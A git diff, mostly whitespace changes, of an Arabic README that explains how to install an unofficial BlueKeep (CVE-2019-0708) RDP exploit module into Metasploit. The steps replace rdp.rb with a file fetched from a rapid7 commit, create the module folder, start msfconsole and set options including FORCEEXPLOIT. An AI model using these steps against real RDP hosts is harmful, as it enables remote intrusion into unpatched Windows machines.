@@ -1,6 +1,10 @@
 # bluekeep
-CVE- 2019-0708 هذه هي ثغرة الارديبي الاخيرة رقمها 
+ CVE- 2019-0708 هذه هي ثغرة الارديبي الاخيرة رقمها
+ 
+ 
 للثغرة عدة مشاكل ولغاية لحظة بدء هذا المشروع لم يقوم رابد7 الى الان بوضعها في تحديثات الميتا سبلويت وهذا الاصدر فيها عدة مشاكل
+
+
 
 
 طريقة تنصيب بسيطة يجب ان تقوم بتحديث الميتا سبلويت الى اخر اصدار عن  طريق جميع هذه الاوامر
@@ -19,7 +23,10 @@ cd cd /usr/share/metasploit-framework/lib/msf/core/exploit/
 rm rdp.rb
 
 wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb
+
+
 mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/
+
 
 cd /usr/share/metasploit-framework/modules/exploits/windows/rdp/
 
@@ -33,9 +40,11 @@ msfdb init
 
 msfconsole
 
-
 الان بعض الاوامر المهمة لدخول للثغرة واستخدامها
+
+
 set target 1
+
 
 set FORCEEXPLOIT true
 
